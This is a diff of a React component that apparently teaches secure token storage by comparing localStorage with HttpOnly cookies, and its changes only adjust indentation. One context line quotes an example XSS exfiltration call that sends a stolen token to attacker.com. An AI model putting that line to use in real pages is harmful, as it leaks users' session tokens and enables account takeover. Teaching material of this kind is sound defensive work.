@@ -30,7 +30,7 @@ export function TokenStorageDemo() {
         >
           ✅ HttpOnly Cookies
         </button>
-      </div>
+          </div>
 
       {/* Content - min-height prevents layout shift */}
       <div className="min-h-[380px]">
@@ -48,7 +48,7 @@ fetch('https://attacker.com?token=' + stolen)`}
             </CodeBox>
             <p className="text-sm text-gray-1100 dark:text-gray-1100">
               localStorage is accessible via JavaScript. If there's XSS, the attacker steals your token and authenticates as you.
-            </p>
+              </p>
           </div>
         )}
 
@@ -73,10 +73,10 @@ document.cookie // → "" (empty, protected!)`}
               <li><span className="font-medium">secure:</span> HTTPS only</li>
               <li><span className="font-medium">sameSite:</span> CSRF protection</li>
               <li><span className="font-medium">Automatic:</span> Browser manages sending</li>
-            </ul>
+                </ul>
             <p className="text-sm text-gray-1100 dark:text-gray-1100 italic mt-4">
               💡 Even with XSS, the attacker cannot steal an HttpOnly cookie.
-            </p>
+              </p>
           </div>
         )}
       </div>
